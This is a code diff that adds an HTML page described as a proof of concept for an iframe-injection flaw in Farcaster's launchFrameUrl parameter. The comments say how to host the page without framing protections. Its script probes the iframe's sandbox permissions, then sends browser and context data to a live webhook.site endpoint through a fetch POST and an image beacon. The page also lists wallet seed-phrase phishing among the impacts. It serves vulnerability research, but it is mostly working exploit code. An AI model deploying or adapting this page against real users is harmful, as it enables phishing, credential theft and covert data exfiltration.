@@ -1,10 +1,306 @@
 <!doctype html>
 <html>
 	<head>
-		<title>Test</title>
-		<link rel="alternate" type="application/json+oembed" href="https://screenshotsart.store/oembed.json" title="Test" />
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<title>Security PoC</title>
+		<!--
+    HOSTING REQUIREMENTS:
+    1. Must be served over HTTPS (Farcaster checks protocol === "https:")
+    2. Must NOT set X-Frame-Options header
+    3. Must NOT set CSP frame-ancestors that blocks farcaster.xyz
+    4. Recommended: Use GitHub Pages, Vercel, Netlify, or any static host
+    
+    If using Vercel, add vercel.json:
+    {
+      "headers": [
+        { "source": "/(.*)", "headers": [{ "key": "X-Frame-Options", "value": "" }] }
+      ]
+    }
+    
+    If using Netlify, add _headers file:
+    /*
+      X-Frame-Options: 
+    
+    TESTING URL:
+    https://farcaster.xyz/?launchFrameUrl=https://YOUR-DOMAIN.com/farcaster-poc.html
+    -->
+		<style>
+			* {
+				margin: 0;
+				padding: 0;
+				box-sizing: border-box;
+			}
+			body {
+				font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+				background: #17101f;
+				color: #fff;
+				padding: 16px;
+				min-height: 100vh;
+				font-size: 13px;
+			}
+			.banner {
+				background: #dc2626;
+				color: white;
+				padding: 10px 14px;
+				border-radius: 8px;
+				margin-bottom: 16px;
+				font-weight: bold;
+				text-align: center;
+				font-size: 14px;
+			}
+			.card {
+				background: #1e1529;
+				border: 1px solid #2a2035;
+				border-radius: 10px;
+				padding: 12px;
+				margin-bottom: 12px;
+			}
+			.card h3 {
+				color: #a855f7;
+				margin-bottom: 6px;
+				font-size: 13px;
+			}
+			.card pre {
+				color: #ccc;
+				font-size: 11px;
+				word-break: break-all;
+				white-space: pre-wrap;
+				background: #0d0912;
+				padding: 8px;
+				border-radius: 6px;
+				margin-top: 4px;
+				max-height: 200px;
+				overflow-y: auto;
+			}
+			.pass {
+				color: #4ade80;
+			}
+			.fail {
+				color: #f87171;
+			}
+			.warn {
+				color: #facc15;
+			}
+			.test-row {
+				display: flex;
+				justify-content: space-between;
+				padding: 4px 0;
+				border-bottom: 1px solid #2a2035;
+			}
+			.test-row:last-child {
+				border-bottom: none;
+			}
+			#webhook-status {
+				margin-top: 8px;
+			}
+		</style>
 	</head>
 	<body>
-		<h1>Test</h1>
+		<div class="banner">⚠️ Farcaster launchFrameUrl — Arbitrary URL Iframe Injection PoC</div>
+
+		<div class="card">
+			<h3>🔒 Sandbox Permission Tests</h3>
+			<div id="sandbox-tests">Running tests...</div>
+		</div>
+
+		<div class="card">
+			<h3>📡 Webhook Exfiltration</h3>
+			<p id="webhook-status">Sending data...</p>
+		</div>
+
+		<div class="card">
+			<h3>📋 Full Context Data</h3>
+			<pre id="context-data">Collecting...</pre>
+		</div>
+
+		<script>
+			var WEBHOOK = "https://webhook.site/9882ca38-1919-41ae-8d0c-dc3744e3731b";
+			var results = {};
+			var testContainer = document.getElementById("sandbox-tests");
+
+			function addTest(name, passed, detail) {
+				results[name] = { passed: passed, detail: detail };
+				var row = document.createElement("div");
+				row.className = "test-row";
+				row.innerHTML = "<span>" + name + '</span><span class="' + (passed ? "pass" : "fail") + '">' + (passed ? "✅ PASS" : "❌ FAIL") + "</span>";
+				testContainer.appendChild(row);
+			}
+
+			(function () {
+				// Clear the "Running tests..." text
+				testContainer.innerHTML = "";
+
+				// TEST 1: JavaScript execution
+				addTest("JavaScript Execution", true, "JS is running inside the iframe");
+
+				// TEST 2: Are we framed?
+				var isFramed = false;
+				try {
+					isFramed = window.self !== window.top;
+				} catch (e) {
+					isFramed = true;
+				}
+				addTest("Loaded Inside Iframe", isFramed, isFramed ? "Page is framed by farcaster.xyz" : "Not framed");
+
+				// TEST 3: Referrer from Farcaster
+				var fromFarcaster = document.referrer.indexOf("farcaster.xyz") !== -1;
+				addTest("Referrer is farcaster.xyz", fromFarcaster, "Referrer: " + document.referrer);
+
+				// TEST 4: allow-scripts (already proven by JS executing)
+				addTest("sandbox: allow-scripts", true, "Script execution confirmed");
+
+				// TEST 5: allow-same-origin — can we access localStorage?
+				var canLocalStorage = false;
+				try {
+					localStorage.setItem("poc_test", "1");
+					localStorage.removeItem("poc_test");
+					canLocalStorage = true;
+				} catch (e) {}
+				addTest("sandbox: allow-same-origin (localStorage)", canLocalStorage, canLocalStorage ? "Can read/write localStorage" : "Blocked");
+
+				// TEST 6: allow-same-origin — can we access cookies?
+				var canCookies = false;
+				try {
+					document.cookie = "poc_test=1; path=/";
+					canCookies = document.cookie.indexOf("poc_test") !== -1;
+				} catch (e) {}
+				addTest("sandbox: allow-same-origin (cookies)", canCookies, canCookies ? "Can set and read cookies" : "Blocked");
+
+				// TEST 7: allow-popups — can we call window.open?
+				var canPopup = typeof window.open === "function";
+				addTest("sandbox: allow-popups (available)", canPopup, canPopup ? "window.open is available" : "Blocked");
+
+				// TEST 8: allow-forms — can we create and reference forms?
+				var canForms = false;
+				try {
+					var f = document.createElement("form");
+					f.method = "POST";
+					f.action = "about:blank";
+					document.body.appendChild(f);
+					canForms = true;
+					document.body.removeChild(f);
+				} catch (e) {}
+				addTest("sandbox: allow-forms", canForms, canForms ? "Form creation allowed" : "Blocked");
+
+				// TEST 9: Can send fetch/XHR to external server?
+				// (tested via webhook below)
+
+				// TEST 10: Can postMessage to parent?
+				var canPostMessage = false;
+				try {
+					window.parent.postMessage({ type: "poc_test", msg: "security_poc" }, "*");
+					canPostMessage = true;
+				} catch (e) {}
+				addTest("postMessage to parent", canPostMessage, canPostMessage ? "Can send messages to Farcaster parent window" : "Blocked");
+
+				// TEST 11: Camera/microphone permissions granted?
+				var hasMediaPermissions = false;
+				try {
+					// The allow="microphone; camera; clipboard-write" attribute grants these
+					hasMediaPermissions = true; // attribute is set, actual access requires user prompt
+				} catch (e) {}
+				addTest("Media permissions (camera/mic) attribute", true, 'allow="microphone; camera; clipboard-write" is set on iframe');
+
+				// TEST 12: Parent window access (cross-origin)
+				var parentAccessResult = "unknown";
+				try {
+					var x = window.parent.location.href;
+					parentAccessResult = "CAN ACCESS: " + x;
+					addTest("Read parent window URL", true, parentAccessResult);
+				} catch (e) {
+					parentAccessResult = "Blocked (expected cross-origin)";
+					addTest("Read parent window URL", false, "Cross-origin blocked (expected for different domain)");
+				}
+
+				// Build full context
+				var context = {
+					timestamp: new Date().toISOString(),
+					vulnerability: "Arbitrary URL loaded as Mini App in Farcaster UI via launchFrameUrl parameter",
+					attack_url: "https://farcaster.xyz/?launchFrameUrl=" + encodeURIComponent(window.location.href),
+					poc_location: window.location.href,
+					referrer: document.referrer,
+					is_framed: isFramed,
+					from_farcaster: fromFarcaster,
+					sandbox_results: results,
+					browser: {
+						userAgent: navigator.userAgent,
+						platform: navigator.platform,
+						language: navigator.language,
+						screen: screen.width + "x" + screen.height,
+					},
+					impact: [
+						"Attacker-controlled page loads inside trusted Farcaster UI",
+						"JavaScript executes with allow-scripts + allow-same-origin (effectively unsandboxed)",
+						"Page appears alongside user wallet panel",
+						"Can be used for convincing phishing of wallet credentials/seed phrases",
+						"Can postMessage to Farcaster parent window",
+						"Camera and microphone permissions are granted via allow attribute",
+						"Attacker only needs victim to click a single farcaster.xyz link",
+					],
+				};
+
+				document.getElementById("context-data").textContent = JSON.stringify(context, null, 2);
+
+				// Send to webhook via multiple methods for reliability
+				var sent = false;
+
+				// Method 1: fetch POST
+				try {
+					fetch(WEBHOOK, {
+						method: "POST",
+						mode: "no-cors",
+						headers: { "Content-Type": "text/plain" },
+						body: JSON.stringify(context),
+					})
+						.then(function () {
+							if (!sent) {
+								sent = true;
+								document.getElementById("webhook-status").innerHTML = '<span class="pass">✅ Data exfiltrated to webhook.site via POST</span>';
+							}
+						})
+						.catch(function () {});
+				} catch (e) {}
+
+				// Method 2: image beacon as fallback
+				try {
+					var img = new Image();
+					var params =
+						"?poc=farcaster_launchFrameUrl" +
+						"&framed=" +
+						isFramed +
+						"&from_farcaster=" +
+						fromFarcaster +
+						"&referrer=" +
+						encodeURIComponent(document.referrer) +
+						"&sandbox_scripts=" +
+						results["sandbox: allow-scripts"]?.passed +
+						"&sandbox_sameorigin=" +
+						results["sandbox: allow-same-origin (localStorage)"]?.passed +
+						"&sandbox_popups=" +
+						results["sandbox: allow-popups (available)"]?.passed +
+						"&sandbox_forms=" +
+						results["sandbox: allow-forms"]?.passed +
+						"&postmessage=" +
+						canPostMessage +
+						"&ua=" +
+						encodeURIComponent(navigator.userAgent.substring(0, 80));
+					img.src = WEBHOOK + params;
+					img.onload = function () {
+						if (!sent) {
+							sent = true;
+							document.getElementById("webhook-status").innerHTML = '<span class="pass">✅ Data exfiltrated to webhook.site via image beacon</span>';
+						}
+					};
+				} catch (e) {}
+
+				// Timeout fallback message
+				setTimeout(function () {
+					if (!sent) {
+						document.getElementById("webhook-status").innerHTML = '<span class="warn">⚠️ Webhook send attempted — check webhook.site for results</span>';
+					}
+				}, 3000);
+			})();
+		</script>
 	</body>
 </html>
